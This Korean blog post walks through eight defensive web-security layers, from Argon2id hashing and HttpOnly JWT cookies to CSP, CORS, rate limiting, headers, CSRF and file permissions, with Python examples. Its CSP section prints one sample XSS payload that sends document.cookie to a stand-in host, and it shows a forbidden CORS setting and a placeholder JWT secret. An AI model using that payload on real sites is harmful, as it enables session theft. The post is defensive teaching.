---
layout: post
title: "웹 보안 다층 방어: 실전에서 적용한 8가지 레이어"
categories: [Security, Web]
description: 웹 서비스에 실제로 적용한 보안 조치를 다층 방어 관점에서 정리합니다. 비밀번호 해싱, JWT, CSP, CORS, Rate Limiting까지 실전 코드와 함께 소개합니다.
keywords: [Security, JWT, Argon2id, CSP, CORS, XSS]
toc: true
toc_sticky: true
---

## Hook

사용자의 비밀번호를 데이터베이스에 그대로 저장하고 있다면, 해킹은 "언제"의 문제가 아니라 "이미"의 문제입니다.

웹 서비스에 로그인 기능이 있다면, 이 글을 읽어야 할 수도 있습니다. 비밀번호 해싱부터 CORS까지, 실제 서비스에 적용한 8개 보안 레이어를 다층 방어 관점에서 정리합니다.

---

## TL;DR

- **비밀번호는 반드시 Argon2id로 해싱**: SHA256도, bcrypt도 아닙니다
- **JWT는 HttpOnly 쿠키에**: localStorage는 XSS에 무방비
- **CSP 하나로 XSS의 80%를 막습니다**: `script-src 'self'`만으로도
- **CORS에 `*` + credentials 조합은 절대 금지**
- **Rate Limiting으로 무차별 대입을 차단**: 60초당 10회

---

## 방어 레이어 구조

```
[Rate Limiter] → [CSP Header] → [Auth Middleware] → [Input Validation] → [Safe Storage]
   외부 공격        XSS 차단         인증 확인          SQLi/XSS          해싱/암호화
```

한 레이어를 뚫어도 다음 레이어가 막아주는 구조입니다.

---

## Layer 1: 비밀번호 해싱 (Argon2id)

### 무엇을 막는가

데이터베이스 유출 시 평문 비밀번호 노출을 방지합니다.

### 왜 SHA256이나 bcrypt가 아닌가

| 알고리즘 | GPU 저항 | 메모리 저항 | 측면 채널 저항 |
|----------|---------|-----------|--------------|
| MD5/SHA-256 | ❌ | ❌ | ❌ |
| bcrypt | △ | ❌ | ❌ |
| **Argon2id** | ✅ | ✅ | ✅ |

Argon2id는 2015년 Password Hashing Competition 1위 알고리즘입니다. `memory_cost`로 GPU 병렬화 비용을 급증시키고, `time_cost`로 반복 계산을 강제합니다.

### 구현

```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,
    memory_cost=65536,
    parallelism=1,
    salt_len=16,
    hash_len=32,
)

hashed = ph.hash("user-password")
ph.verify(hashed, "user-password")
```

- `memory_cost=65536`: 64MB 메모리 사용 → GPU는 코어가 많아도 메모리 대역폭이 병목
- `time_cost=3`: 3회 반복 → 공격자와 정상 사용자 모두 느려지지만 보안이 우선
- `salt_len=16`: 동일 비밀번호도 매번 다른 해시 생성 → 레인보우 테이블 무효화

### 타이밍 공격 방어

존재하지 않는 아이디로 로그인해도 해싱을 수행하여 응답 시간 차이를 없앱니다.

```python
user = users.get(username)
if not user:
    ph.hash(secrets.token_urlsafe(16))
    return None
if not ph.verify(user["password_hash"], password):
    return None
```

---

## Layer 2: JWT 인증 (HttpOnly 쿠키)

### 무엇을 막는가

비인가 접근과 토큰 탈취를 방지합니다.

### Session vs JWT

| 구분 | Session | JWT |
|------|---------|-----|
| 상태 | 서버에 세션 저장 | Stateless (토큰에 정보 포함) |
| 확장성 | 서버 확장 시 공유 필요 | 수평 확장 용이 |
| 무효화 | 서버에서 즉시 삭제 | 만료까지 유효 |

### 저장 위치 비교

| 저장소 | XSS | 권장 |
|--------|-----|------|
| localStorage | ❌ JS로 접근 가능 | ❌ |
| **HttpOnly 쿠키** | ✅ JS 접근 불가 | ✅ |

```
XSS 공격 시나리오:
  악성 스크립트 주입 → localStorage.getItem('token') ← 접근 가능!
  악성 스크립트 주입 → document.cookie ← HttpOnly면 접근 불가!
```

### 이중 토큰 전략

| | access_token | refresh_token |
|--|-------------|---------------|
| 수명 | 15분 | 7일 |
| path | `/` | `/api/auth/refresh` |
| 유출 피해 | 15분 이내만 유효 | 7일간 유효 (위험) |

### 구현

```python
import jwt
from datetime import datetime, timedelta, timezone

SECRET = "your-secret-key"

def create_token(user_id: str, token_type: str, delta: timedelta) -> str:
    return jwt.encode(
        {"sub": user_id, "type": token_type, "exp": datetime.now(timezone.utc) + delta},
        SECRET, algorithm="HS256",
    )

response.set_cookie("access_token", create_token(uid, "access", timedelta(minutes=15)),
                     httponly=True, secure=True, samesite="lax", max_age=900, path="/")
response.set_cookie("refresh_token", create_token(uid, "refresh", timedelta(days=7)),
                     httponly=True, secure=True, samesite="lax", max_age=604800, path="/api/auth/refresh")
```

### 인증 흐름

1. **로그인** → Argon2id 검증 → access + refresh 토큰을 HttpOnly 쿠키로 설정
2. **API 요청** → 쿠키에서 access_token 추출 → JWT 검증 → 사용자 식별
3. **토큰 만료** → 401 → 프론트엔드가 `/api/auth/refresh` 호출 → 새 토큰 발급

---

## Layer 3: Content-Security-Policy

### 무엇을 막는가

XSS 공격의 약 80%를 차단합니다. 인라인 스크립트, 이벤트 핸들러, 미승인 도메인 스크립트를 모두 차단합니다.

```
공격: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
CSP 있음 → onerror 핸들러 차단 → 스크립트 실행 안 됨
```

### 주요 디렉티브

| 디렉티브 | 값 | 목적 |
|----------|-----|------|
| `default-src` | `'self'` | 기본: 같은 출처만 |
| `script-src` | `'self'` | 스크립트: 같은 출처만 |
| `style-src` | `'self' 'unsafe-inline'` | 스타일: 인라인 허용 (프레임워크 필요) |
| `connect-src` | `'self'` | AJAX: 같은 출처만 |
| `img-src` | `'self' data:` | 이미지: 같은 출처 + data URI |
| `frame-ancestors` | `'none'` | iframe 삽입 금지 |

### 개발 vs 프로덕션

```python
if dev_mode:
    csp = "script-src 'self' 'unsafe-inline' http://localhost:5173; ..."
else:
    csp = "script-src 'self'; ..."
```

개발 중에는 HMR을 위해 완화하고, 프로덕션에서는 `unsafe-*`를 모두 제거합니다.

---

## Layer 4: CORS 설정

### 무엇을 막는가

허용되지 않은 출처의 API 요청을 차단합니다.

### 절대 금지

```python
# ❌ 절대 금지: 모든 도메인 + 인증 정보
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)
```

이 조합은 어떤 사이트든 인증된 요청을 보낼 수 있게 만듭니다.

### 올바른 설정

```python
app.add_middleware(CORSMiddleware,
    allow_origins=["https://app.example.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)
```

특정 도메인만 허용하는 것이 원칙입니다.

---

## Layer 5: Rate Limiting

### 무엇을 막는가

무차별 대입 공격(Brute Force)을 차단합니다.

### 구현

IP별로 시간 윈도우 내 요청 횟수를 제한합니다.

```python
class RateLimiter:
    def __init__(self, max_requests=10, window_seconds=60):
        self.max_requests = max_requests
        self.window = window_seconds
        self.requests: dict[str, list[float]] = defaultdict(list)

    def is_allowed(self, client_ip: str) -> bool:
        now = time.time()
        self.requests[client_ip] = [t for t in self.requests[client_ip] if now - t < self.window]
        if len(self.requests[client_ip]) >= self.max_requests:
            return False
        self.requests[client_ip].append(now)
        return True
```

60초당 10회 초과 시 `429 Too Many Requests`를 반환합니다. 프로덕션에서는 Redis 기반으로 다중 서버 환경을 지원하는 것이 좋습니다.

---

## Layer 6: 보안 응답 헤더

### 무엇을 막는가

MIME 스니핑, 클릭재킹, HTTP 다운그레이드, 정보 유출 등 다양한 공격을 방지합니다.

### 헤더 목록

| 헤더 | 값 | 목적 |
|------|-----|------|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | HTTPS 강제 (2년) |
| `X-Frame-Options` | `DENY` | iframe 삽입 차단 (클릭재킹 방어) |
| `X-Content-Type-Options` | `nosniff` | MIME 타입 추측 방지 |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 교차 출처에 경로 정보 숨김 |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | 카메라·마이크·위치 접근 차단 |

```python
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
        return response
```

---

## Layer 7: CSRF 3중 방어

### 무엇을 막는가

CSRF(Cross-Site Request Forgery). 인증된 사용자의 브라우저를 이용해 의도하지 않은 요청을 보내는 공격입니다.

### 3중 방어

- **SameSite=Lax**: 교차 사이트 POST/PUT/DELETE에 쿠키가 전송되지 않습니다
- **Origin 검증 (CORS)**: 허용되지 않은 출처의 요청을 CORS 미들웨어가 차단합니다
- **JSON Content-Type 요구**: HTML `<form>`은 `application/x-www-form-urlencoded`로 전송하므로, JSON을 요구하면 폼 기반 CSRF가 불가능합니다

---

## Layer 8: 파일 권한

### 무엇을 막는가

서버의 다른 사용자(또는 탈취된 서비스)가 시크릿 파일에 접근하는 것을 방지합니다.

### 권한 체계

| 권한 | 표기 | 용도 |
|------|------|------|
| `600` | `rw-------` | 시크릿 파일 (JWT 시크릿, 사용자 데이터) |
| `700` | `rwx------` | 인증 디렉토리 (소유자만 접근) |
| `644` | `rw-r--r--` | 일반 파일 (소유자 읽기/쓰기, 나머지 읽기) |

```python
import os

os.makedirs(data_dir, mode=0o700, exist_ok=True)
os.chmod(secret_file, 0o600)
```

시크릿 파일이 `644`이면 서버의 다른 사용자가 `cat`으로 읽을 수 있고, JWT 시크릿을 탈취하면 모든 토큰을 위조할 수 있습니다.

---

## 보안 체크리스트

### 개발 시

- [ ] 인증이 필요한 엔드포인트에 인증 의존성 추가
- [ ] Pydantic으로 모든 입력 검증 (패턴, 길이, 특수문자)
- [ ] 템플릿에서 `{@html}` / `v-html` / `dangerouslySetInnerHTML` 사용 금지
- [ ] 쿠키 속성: `httponly=True, secure=True, samesite=lax`
- [ ] 파일 생성 시 권한 설정 (`600` / `700`)

### 배포 전

- [ ] `secure=True`. HTTPS에서만 쿠키 전송
- [ ] CSP에서 `unsafe-inline`, `unsafe-eval` 제거
- [ ] CORS `allow_origins`에 `*` 없음 (특정 도메인만)
- [ ] HSTS 헤더 활성화 (`max-age=63072000`)
- [ ] Rate Limiter 활성화

---

## 마치며

보안을 처음 공부할 때는 "강력한 암호화 하나면 충분하다"고 믿었습니다. 비밀번호만 강하게 해싱해두면, 또는 JWT만 잘 발급해두면 해커가 들어올 수 없을 거라 생각했죠. 그런데 실제 서비스에 보안을 적용하다 보니, 한 레이어에 집중하면 그 사이사이의 빈틈이 늘어난다는 걸 깨달았습니다. CSP가 인라인 스크립트를 막아주더라도 CORS가 열려 있으면 의미가 없고, Argon2id가 완벽해도 타이밍 공격으로 아이디 존재 여부가 노출됩니다. 결국 보안은 하나의 벽이 아니라 여러 겹의 울타리라는 사실을 몸으로 배웠습니다.

가장 인상 깊었던 순간은 JWT를 localStorage에 두는 것과 HttpOnly 쿠키에 두는 것의 차이를 이해한 때였습니다. 겉으로는 편의성 때문에 localStorage가 매력적으로 보였지만, XSS 공격 시 `getItem()` 한 줄로 토큰이 탈취된다는 시나리오를 그려보니 등골이 서늘해졌습니다. 비밀번호를 평문으로 저장하는 것이 얼마나 위험한지, 그리고 `secure=True` 하나 빠져도 HTTPS가 아닌 환경에서 쿠키가 노출된다는 것도 이 과정에서 처음 제대로 체감했습니다. 보안은 이론으로 아는 것과 실전에서 느끼는 것이 전혀 다른 영역이었습니다.

앞으로는 새로운 엔드포인트를 만들 때마다 "이 한 레이어가 뚫리면 다음 레이어가 막아주는가?"를 묻는 습관을 들이려 합니다. 보안은 완벽한 방어가 아니라 공격 비용을 극대화하는 게임이며, 그 게임에서 살아남으려면 다층 방어 외에는 답이 없다는 걸 확실히 믿게 되었습니다.

---

## 참고 자료

| 자료 | 링크 |
|------|------|
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
| Argon2 RFC 9106 | https://datatracker.ietf.org/doc/html/rfc9106 |
| JWT Best Practices RFC 8725 | https://datatracker.ietf.org/doc/html/rfc8725 |
| MDN, CSP | https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP |
| MDN, CORS | https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS |
